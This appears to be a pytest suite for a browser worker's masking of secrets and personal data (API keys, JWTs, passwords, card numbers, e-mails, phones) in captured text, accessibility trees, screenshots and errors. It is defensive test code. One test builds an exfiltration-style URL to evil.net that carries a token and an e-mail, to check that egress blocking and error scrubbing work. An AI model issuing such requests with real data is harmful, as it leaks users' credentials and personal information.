"""FR-CON-07 masking (PRD 12.3 "secure fields masked in screenshots", 16.1 rule 4, SEC-01,
SEC-14 "no tokens, secure fields or full card numbers"): secrets and PII patterns in what a
worker captures from a page are masked BEFORE the data leaves the worker.

`tilo_browser.masking.mask_text(text) -> str` is the one masker. Placeholders are
`[masked:<kind>]` with kind in {secret, card, email, phone}. For `key=value` / `key: value`
pairs the key is kept and only the value is replaced (`password=[masked:secret]`).

Defaults chosen where the PRD names no pattern list (listed in the ticket report):
- secrets: sk-style API keys, GitHub tokens, AWS access key ids, JWTs, Google OAuth tokens,
  `Bearer <token>`, and the value of password/passwd/pwd/secret/token/api_key/apikey/otp pairs;
- PII: e-mail addresses, international phone numbers written with a leading "+", and payment
  card numbers (13 to 19 digits, spaces or dashes allowed) that pass the Luhn check; a digit run
  that fails Luhn is NOT a card and stays (an order number must survive).
"""

from __future__ import annotations

import re

import pytest
from _browser_lib import EMAIL, PHONE, PNG, FakeWeb, doc, fake_card_numbers, fake_secrets, node, password_box, textbox
from hypothesis import example, given, settings
from hypothesis import strategies as st

SECRETS = fake_secrets()
CARDS = fake_card_numbers()


def mask(text: str) -> str:
    from tilo_browser.masking import mask_text

    return mask_text(text)


@pytest.mark.parametrize("name", ["api_key", "github_token", "aws_key_id", "jwt", "google_oauth"])
def test_FR_CON_07_free_standing_secret_tokens_are_masked(name):
    out = mask(f"Your key is {SECRETS[name]} keep it safe")
    assert SECRETS[name] not in out
    assert out == "Your key is [masked:secret] keep it safe"


def test_FR_CON_07_a_bearer_token_is_masked():
    out = mask(f"Authorization: Bearer {SECRETS['bearer']}")
    assert SECRETS["bearer"] not in out
    assert "[masked:secret]" in out


@pytest.mark.parametrize(
    ("key", "sep", "secret"),
    [
        ("password", "=", SECRETS["password"]),
        ("password", ": ", SECRETS["password"]),
        ("passwd", "=", SECRETS["password"]),
        ("api_key", "=", SECRETS["kv_token"]),
        ("token", "=", SECRETS["kv_token"]),
        ("secret", ": ", SECRETS["kv_token"]),
        ("otp", "=", "482913"),
    ],
)
def test_FR_CON_07_key_value_secrets_keep_the_key_and_lose_the_value(key, sep, secret):
    out = mask(f"before {key}{sep}{secret} after")
    assert secret not in out
    assert f"{key}{sep}[masked:secret]" in out
    assert out.startswith("before ") and out.endswith(" after")


@pytest.mark.parametrize("form", ["plain", "spaced", "dashed"])
def test_FR_CON_07_full_card_numbers_are_masked_in_every_common_layout(form):
    out = mask(f"Pay with {CARDS[form]} today")
    assert CARDS["plain"] not in out.replace(" ", "").replace("-", "")
    assert out == "Pay with [masked:card] today"


def test_FR_CON_07_a_digit_run_that_fails_luhn_is_not_a_card_and_is_kept():
    text = f"Order {CARDS['invalid']} shipped, ref 123456, total 1,299.00 on 2026-10-02"
    assert mask(text) == text


def test_FR_CON_07_email_and_phone_are_masked():
    out = mask(f"Reach {EMAIL} or {PHONE} before noon")
    assert EMAIL not in out and PHONE not in out
    assert out == "Reach [masked:email] or [masked:phone] before noon"


def test_FR_CON_07_text_without_sensitive_patterns_is_unchanged():
    text = "Winter boots, size 42. Passwords must be 12 characters. Open 09:00-17:30 at 5 Main Street."
    assert mask(text) == text


def test_FR_CON_07_masking_is_idempotent():
    text = f"{EMAIL} {CARDS['spaced']} password={SECRETS['password']} {SECRETS['jwt']} Bearer {SECRETS['bearer']}"
    once = mask(text)
    assert mask(once) == once


def test_FR_CON_07_mask_data_masks_every_string_in_nested_data_and_keeps_the_shape():
    from tilo_browser.masking import mask_data

    data = {
        "alt": [f"avatar of {EMAIL}", "logo"],
        "nested": {"note": f"token={SECRETS['kv_token']}", "count": 3, "ok": True, "none": None},
        "n": 1.5,
    }
    out = mask_data(data)
    assert EMAIL not in repr(out) and SECRETS["kv_token"] not in repr(out)
    assert out["alt"][1] == "logo"
    assert out["nested"]["count"] == 3 and out["nested"]["ok"] is True and out["nested"]["none"] is None
    assert out["n"] == 1.5
    assert set(out) == set(data) and set(out["nested"]) == set(data["nested"])
    assert EMAIL in repr(data), "the input must not be mutated"


# ---------------------------------------------------------------------------
# Through the worker: nothing sensitive leaves it.


def _page_with_secrets(web: FakeWeb, url: str):
    return web.add(
        url,
        title=f"Account for {EMAIL}",
        text=(
            f"Hello {EMAIL}. Card on file {CARDS['spaced']}. Phone {PHONE}. "
            f"Debug: password={SECRETS['password']} key {SECRETS['api_key']} jwt {SECRETS['jwt']}. "
            "Winter boots, size 42."
        ),
        tree=doc(
            node("heading", f"Welcome {EMAIL}"),
            textbox("q", "Search", value="winter boots"),
            title="Account",
        ),
        screenshot_meta={
            "alt_texts": [f"photo of {EMAIL}", "shop banner"],
            "form": {"hint": f"token={SECRETS['kv_token']}", "fields": 2},
        },
    )


def _leaks(dump: str) -> list[str]:
    needles = [EMAIL, PHONE, CARDS["plain"], CARDS["spaced"], *SECRETS.values()]
    return [n for n in needles if n in dump]


def test_FR_CON_07_capture_masks_text_title_and_screenshot_metadata_before_it_leaves_the_worker(make_rig):
    rig = make_rig()
    _page_with_secrets(rig.web, "https://example.com/account")
    rig.worker.navigate("https://example.com/account")
    cap = rig.worker.capture()
    assert _leaks(repr(cap)) == []
    assert "[masked:email]" in cap.text and "[masked:card]" in cap.text
    assert "Winter boots, size 42." in cap.text, "non-sensitive text must survive"
    assert cap.meta["alt_texts"][1] == "shop banner" and cap.meta["form"]["fields"] == 2
    assert cap.screenshot == PNG


def test_FR_CON_07_the_accessibility_tree_is_masked_before_it_leaves_the_worker(make_rig):
    rig = make_rig()
    _page_with_secrets(rig.web, "https://example.com/account")
    rig.worker.navigate("https://example.com/account")
    tree = rig.worker.read_accessibility_tree()
    assert _leaks(repr(tree)) == []
    assert "winter boots" in repr(tree), "an ordinary field value is page content and stays"


def test_FR_CON_07_a_secure_field_value_never_leaves_the_worker(make_rig):
    rig = make_rig()
    pw = SECRETS["password"]
    rig.web.add(
        "https://example.com/settings",
        title="Settings",
        tree=doc(
            password_box("pw", "New password", value=pw),
            textbox("cc", "Card number", value="not-a-luhn-number", autocomplete="cc-number"),
            textbox("code", "Verification code", value="123456", autocomplete="one-time-code"),
            title="Settings",
        ),
    )
    rig.worker.navigate("https://example.com/settings")
    tree = rig.worker.read_accessibility_tree()
    assert pw not in repr(tree) and "not-a-luhn-number" not in repr(tree) and "123456" not in repr(tree)
    assert pw not in repr(rig.worker.capture())


def test_FR_CON_07_screenshots_mask_every_secure_field_and_nothing_else(make_rig):
    rig = make_rig()
    rig.web.add(
        "https://example.com/checkout",
        tree=doc(
            textbox("q", "Search"),
            password_box("pw"),
            textbox("cc", "Card number", autocomplete="cc-number"),
            textbox("cvc", "CVC", autocomplete="cc-csc"),
            textbox("otp", "Code", autocomplete="one-time-code"),
            title="Checkout",
        ),
    )
    rig.web.add("https://example.com/plain", tree=doc(textbox("q", "Search"), title="Plain"))
    rig.worker.navigate("https://example.com/checkout")
    assert rig.worker.screenshot() == PNG
    assert sorted(rig.driver.screenshot_mask_refs[-1]) == ["cc", "cvc", "otp", "pw"]
    rig.worker.navigate("https://example.com/plain")
    rig.worker.screenshot()
    assert rig.driver.screenshot_mask_refs[-1] == []


def test_FR_CON_07_a_blocked_request_error_does_not_echo_the_url_secrets(make_rig):
    from tilo_browser.egress import EgressBlocked

    rig = make_rig()
    url = f"https://evil.net/x?token={SECRETS['kv_token']}&mail={EMAIL}"
    with pytest.raises(EgressBlocked) as ei:
        rig.worker.navigate(url)
    assert SECRETS["kv_token"] not in str(ei.value) and EMAIL not in str(ei.value)
    assert _leaks(repr(rig.policy.decisions)) == []


# ---------------------------------------------------------------------------
# Properties.

NOISE = st.text(alphabet="abcdefghij klmnopqrst", max_size=30)
# (fragment as it appears on the page, the sensitive value inside it)
FRAGMENTS = [(SECRETS[k], SECRETS[k]) for k in ("api_key", "github_token", "aws_key_id", "jwt", "google_oauth")]
FRAGMENTS += [(f"Authorization: Bearer {SECRETS['bearer']}", SECRETS["bearer"])]
FRAGMENTS += [
    (f"password={SECRETS['password']}", SECRETS["password"]),
    (f"token: {SECRETS['kv_token']}", SECRETS["kv_token"]),
]
FRAGMENTS += [(CARDS[k], CARDS["plain"]) for k in ("plain", "spaced", "dashed")] + [(EMAIL, EMAIL)]


# Hypothesis seeds 5 and 8 (issue #714) found `bearer` right before an `sk-` key: the masker takes `bearer <token>` as
# a credential and masks the scheme word with it. The key does not survive, so this is not a leak; the property below
# allows exactly that absorption and nothing else. Pinned so the case runs on every seed.
@example(before="bearer", fragment=FRAGMENTS[0], after="")
@example(before="a bearer", fragment=FRAGMENTS[0], after="b")
@example(before="bearer", fragment=FRAGMENTS[0], after="bearer")
@given(before=NOISE, fragment=st.sampled_from(FRAGMENTS), after=NOISE)
@settings(max_examples=80, deadline=None)
def test_FR_CON_07_a_secret_embedded_in_any_text_never_survives_masking(before, fragment, after):
    shown, sensitive = fragment
    out = mask(f"{before} {shown} {after}")
    flat = out.replace(" ", "").replace("-", "") if sensitive == CARDS["plain"] else out
    assert sensitive not in flat
    assert mask(out) == out
    # `bearer <token>` is one credential: a trailing scheme word of `before` may be masked with the token.
    kept = re.sub(r"(?i)(?:^|(?<=\s))bearer\s*$", "", before)
    assert out.startswith(kept) and out.endswith(after), "text around the secret must be untouched"


@given(text=NOISE)
@settings(max_examples=80, deadline=None)
def test_FR_CON_07_text_with_nothing_sensitive_is_returned_unchanged(text):
    assert mask(text) == text
